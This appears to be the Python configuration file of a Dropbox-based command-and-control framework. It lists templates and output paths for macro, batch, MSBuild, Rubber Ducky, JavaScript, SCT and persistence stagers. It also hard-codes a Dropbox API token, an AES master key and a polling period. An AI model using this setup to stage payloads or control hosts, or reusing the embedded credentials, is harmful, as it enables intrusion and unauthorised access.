# -*- coding: utf8 -*-
defaultPath = {
	'agentRelease': './agent/release',
	'incoming': './incoming',
	'modules': './modules',
	'poshTpl': './templates/posh.tpl',
	'onelinerTpl': './templates/oneliner.tpl',
	'batchTpl': './templates/batch.tpl',
	'msbuildTpl': './templates/msbuild.tpl',
	'duckyTpl': './templates/ducky.tpl',
	'javascriptTpl': './templates/javascript.tpl',
	'sctTpl': './templates/sct.tpl',
	'runPSModuleTpl': './templates/runPSModule.tpl',
	'persistTpl': './templates/persist.tpl',
	'macroStager': '/tmp/stager.vba',
	'batchStager': '/tmp/stager.bat',
	'msbuildStager': '/tmp/msbuild.xml',
	'duckyStager': '/tmp/ducky.txt',
	'javascriptStager': '/tmp/stager.js',
	'sctStager': '/tmp/stager.sct'
}

# Dropbox API access token
# If this entry is empty or missing, user will be prompted to enter it manually at startup
defaultAccessToken = "fQ3BQYzqGrAAAAAAAAAAZm81_lZTdDJ9YLypKHA53Se3U0d2ZvhYtCfaPcXNnGx7"

# Base64 encoded 128 bits key used for AES encryption
# If this entry is empty or missing, user will be prompted to enter it manually at startup
defaultMasterKey = "kFJHsQJAwJXaT40EmaA3Mw=="

# Background polling period in seconds
defaultPollingPeriod = 8 
